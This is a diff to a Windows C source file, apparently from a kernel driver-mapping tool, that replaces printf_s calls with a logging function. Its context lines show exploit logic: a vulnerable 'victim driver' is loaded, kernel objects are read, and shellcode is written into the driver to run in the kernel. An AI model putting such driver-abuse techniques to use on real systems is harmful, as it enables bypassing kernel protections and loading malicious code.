@@ -6,7 +6,7 @@
 *
 *  VERSION:     1.10
 *
-*  DATE:        02 Apr 2021
+*  DATE:        15 Apr 2021
 *
 *  Driver mapping routines.
 *
@@ -65,20 +65,30 @@ VOID KDUShowPayloadResult(
         switch (Context->ShellVersion) {
 
         case KDU_SHELLCODE_V2:
-            printf_s("[~] Shellcode result, system worker: 0x%p\r\n", (PVOID)pvPayloadHead.Version.v1->IoStatus.Information);
+            
+            supPrintfEvent(kduEventInformation, 
+                "[~] Shellcode result, system worker: 0x%p\r\n", 
+                (PVOID)pvPayloadHead.Version.v1->IoStatus.Information);
+            
             break;
 
         case KDU_SHELLCODE_V3:
         case KDU_SHELLCODE_V1:
         default:
-            printf_s("[~] Shellcode result: NTSTATUS (0x%lX)\r\n", pvPayloadHead.Version.v1->IoStatus.Status);
+            
+            supPrintfEvent(kduEventInformation, 
+                "[~] Shellcode result: NTSTATUS (0x%lX)\r\n", pvPayloadHead.Version.v1->IoStatus.Status);
+            
             break;
         }
 
         NtUnmapViewOfSection(NtCurrentProcess(), pvPayloadHead.Ref);
     }
     else {
-        printf_s("[!] Cannot map shellcode section, NTSTATUS (%lX)\r\n", ntStatus);
+        
+        supPrintfEvent(kduEventError, 
+            "[!] Cannot map shellcode section, NTSTATUS (%lX)\r\n", ntStatus);
+
     }
 }
 
@@ -150,7 +160,10 @@ BOOL KDUStorePayloadInSection(
         //
         pvPayloadHead.Ref = supHeapAlloc(cbPayloadHead);
         if (pvPayloadHead.Ref == NULL) {
-            printf_s("[!] Error, payload header not allocated\r\n");
+            
+            supPrintfEvent(kduEventError, 
+                "[!] Error, payload header not allocated\r\n");
+            
             break;
         }
 
@@ -159,7 +172,10 @@ BOOL KDUStorePayloadInSection(
         //
         ntStatus = supCreateSystemAdminAccessSD(&sectionSD, &defaultAcl);
         if (!NT_SUCCESS(ntStatus)) {
-            printf_s("[!] Error, shared section SD not allocated, NTSTATUS (0x%lX)\r\n", ntStatus);
+            
+            supPrintfEvent(kduEventError, 
+                "[!] Error, shared section SD not allocated, NTSTATUS (0x%lX)\r\n", ntStatus);
+            
             break;
         }
 
@@ -167,7 +183,10 @@ BOOL KDUStorePayloadInSection(
         // Create UUID.
         //
         if (RPC_S_OK != UuidCreate(&secUuid)) {
-            printf_s("[!] Could not allocate shared section UUID, GetLastError %lu\r\n", GetLastError());
+            
+            supPrintfEvent(kduEventError, 
+                "[!] Could not allocate shared section UUID, GetLastError %lu\r\n", GetLastError());
+            
             break;
         }
 
@@ -187,7 +206,10 @@ BOOL KDUStorePayloadInSection(
 
         }
         else {
-            printf_s("[!] Could not allocate memory for image\r\n");
+            
+            supPrintfEvent(kduEventError, 
+                "[!] Could not allocate memory for image\r\n");
+            
             break;
         }
 
@@ -225,7 +247,10 @@ BOOL KDUStorePayloadInSection(
             NULL);
 
         if (!NT_SUCCESS(ntStatus)) {
-            printf_s("[!] Error, cannot create shared section, NTSTATUS (0x%lX)\r\n", ntStatus);
+            
+            supPrintfEvent(kduEventError, 
+                "[!] Error, cannot create shared section, NTSTATUS (0x%lX)\r\n", ntStatus);
+            
             break;
         }
 
@@ -271,7 +296,10 @@ BOOL KDUStorePayloadInSection(
                 pvPayloadHead.Version.v1->IoStatus.Status = STATUS_UNSUCCESSFUL;
 
                 if (!ScStoreVersionSpecificData(Context, pvPayloadHead.Ref)) {
-                    printf_s("[!] Error, cannot store additional data for shellcode\r\n");
+                    
+                    supPrintfEvent(kduEventError, 
+                        "[!] Error, cannot store additional data for shellcode\r\n");
+                    
                     break;
                 }
 
@@ -283,12 +311,18 @@ BOOL KDUStorePayloadInSection(
                 bSuccess = TRUE;
             }
             else {
-                printf_s("[!] Error, resolving additional import failed\r\n");
+
+                supPrintfEvent(kduEventError, 
+                    "[!] Error, resolving additional import failed\r\n");
+
             }
 
         }
         else {
-            printf_s("[!] Error, shared section not mapped, NTSTATUS (0x%lX)\r\n", ntStatus);
+
+            supPrintfEvent(kduEventError, 
+                "[!] Error, shared section not mapped, NTSTATUS (0x%lX)\r\n", ntStatus);
+
         }
 
     } while (FALSE);
@@ -345,7 +379,10 @@ PVOID KDUSetupShellCode(
 
         KernelBase = Context->NtOsBase;
         if (KernelBase == 0) {
-            printf_s("[!] Cannot query ntoskrnl loaded base, abort\r\n");
+            
+            supPrintfEvent(kduEventError, 
+                "[!] Cannot query ntoskrnl loaded base, abort\r\n");
+            
             break;
         }
 
@@ -361,7 +398,10 @@ PVOID KDUSetupShellCode(
         ntStatus = LdrLoadDll(NULL, NULL, &ustr, (PVOID*)&KernelImage);
 
         if ((!NT_SUCCESS(ntStatus)) || (KernelImage == 0)) {
-            printf_s("[!] Error while loading ntoskrnl.exe, NTSTATUS (0x%lX)\r\n", ntStatus);
+            
+            supPrintfEvent(kduEventError, 
+                "[!] Error while loading ntoskrnl.exe, NTSTATUS (0x%lX)\r\n", ntStatus);
+            
             break;
         }
 
@@ -377,7 +417,10 @@ PVOID KDUSetupShellCode(
             KernelImage,
             KernelBase))
         {
-            printf_s("[!] Error while mapping payload, abort\r\n");
+            
+            supPrintfEvent(kduEventError, 
+                "[!] Error while mapping payload, abort\r\n");
+            
             break;
         }
 
@@ -398,7 +441,10 @@ PVOID KDUSetupShellCode(
             break;
 
         if (procSize == 0) {
-            printf_s("[!] Unexpected shellcode procedure size, abort\r\n");
+            
+            supPrintfEvent(kduEventError, 
+                "[!] Unexpected shellcode procedure size, abort\r\n");
+            
             ScFree(pvShellCode);
             pvShellCode = NULL;
             break;
@@ -514,7 +560,10 @@ Reload:
         printf_s("[+] Victim driver loaded, handle 0x%p\r\n", victimDeviceHandle);
     }
     else {
-        printf_s("[!] Could not load victim driver, GetLastError %lu\r\n", GetLastError());
+
+        supPrintfEvent(kduEventError, 
+            "[!] Could not load victim driver, GetLastError %lu\r\n", GetLastError());
+
     }
 
     if (supQueryObjectFromHandle(victimDeviceHandle, &objectAddress)) {
@@ -530,7 +579,10 @@ Reload:
                 &fileObject,
                 sizeof(FILE_OBJECT)))
             {
-                printf_s("[!] Could not read FILE_OBJECT at 0x%llX\r\n", objectAddress);
+                
+                supPrintfEvent(kduEventError, 
+                    "[!] Could not read FILE_OBJECT at 0x%llX\r\n", objectAddress);
+                
                 break;
             }
 
@@ -543,7 +595,10 @@ Reload:
                 &deviceObject,
                 sizeof(DEVICE_OBJECT)))
             {
-                printf_s("[!] Could not read DEVICE_OBJECT at 0x%p\r\n", fileObject.DeviceObject);
+                
+                supPrintfEvent(kduEventError, 
+                    "[!] Could not read DEVICE_OBJECT at 0x%p\r\n", fileObject.DeviceObject);
+                
                 break;
             }
 
@@ -556,7 +611,10 @@ Reload:
                 &driverObject,
                 sizeof(DRIVER_OBJECT)))
             {
-                printf_s("[!] Could not read DRIVER_OBJECT at 0x%p\r\n", deviceObject.DriverObject);
+                
+                supPrintfEvent(kduEventError, 
+                    "[!] Could not read DRIVER_OBJECT at 0x%p\r\n", deviceObject.DriverObject);
+                
                 break;
             }
 
@@ -570,10 +628,15 @@ Reload:
 
             if (!KDUCheckMemoryLayout(Context, targetAddress)) {
 
-                printf_s("[!] Physical address is not within same/next page, reload victim driver\r\n");
+                supPrintfEvent(kduEventError, 
+                    "[!] Physical address is not within same/next page, reload victim driver\r\n");
+                
                 retryCount += 1;
                 if (retryCount > maxRetry) {
-                    printf_s("[!] Too many reloads, abort\r\n");
+                    
+                    supPrintfEvent(kduEventError, 
+                        "[!] Too many reloads, abort\r\n");
+                    
                     break;
                 }
                 goto Reload;
@@ -616,7 +679,10 @@ Reload:
                     pvShellCode, 
                     ScSizeOf(Context->ShellVersion, NULL)))
                 {
-                    printf_s("[!] Error writing shellcode to the target driver, abort\r\n");
+                    
+                    supPrintfEvent(kduEventError, 
+                        "[!] Error writing shellcode to the target driver, abort\r\n");
+                    
                     bSuccess = FALSE;
                 }
                 else {
@@ -634,7 +700,10 @@ Reload:
                     // Wait for the shellcode to trigger the event
                     //
                     if (WaitForSingleObject(readyEventHandle, 2000) != WAIT_OBJECT_0) {
-                        printf_s("[!] Shellcode did not trigger the event within two seconds.\r\n");
+                        
+                        supPrintfEvent(kduEventError, 
+                            "[!] Shellcode did not trigger the event within two seconds.\r\n");
+                        
                         bSuccess = FALSE;
                     }
                     else
@@ -647,7 +716,10 @@ Reload:
 
             } //readyEventHandle
             else {
-                printf_s("[!] Error building the ready event handle, abort\r\n");
+                
+                supPrintfEvent(kduEventError, 
+                    "[!] Error building the ready event handle, abort\r\n");
+                
                 bSuccess = FALSE;
             }
 
@@ -658,13 +730,19 @@ Reload:
         } //pvShellCode
 
         else {
-            printf_s("[!] Error while building shellcode, abort\r\n");
+            
+            supPrintfEvent(kduEventError, 
+                "[!] Error while building shellcode, abort\r\n");
+            
             bSuccess = FALSE;
         }
     
     } //bSuccess
     else {
-        printf_s("[!] Error preloading victim driver, abort\r\n");
+        
+        supPrintfEvent(kduEventError, 
+            "[!] Error preloading victim driver, abort\r\n");
+        
         bSuccess = FALSE;
     }
 
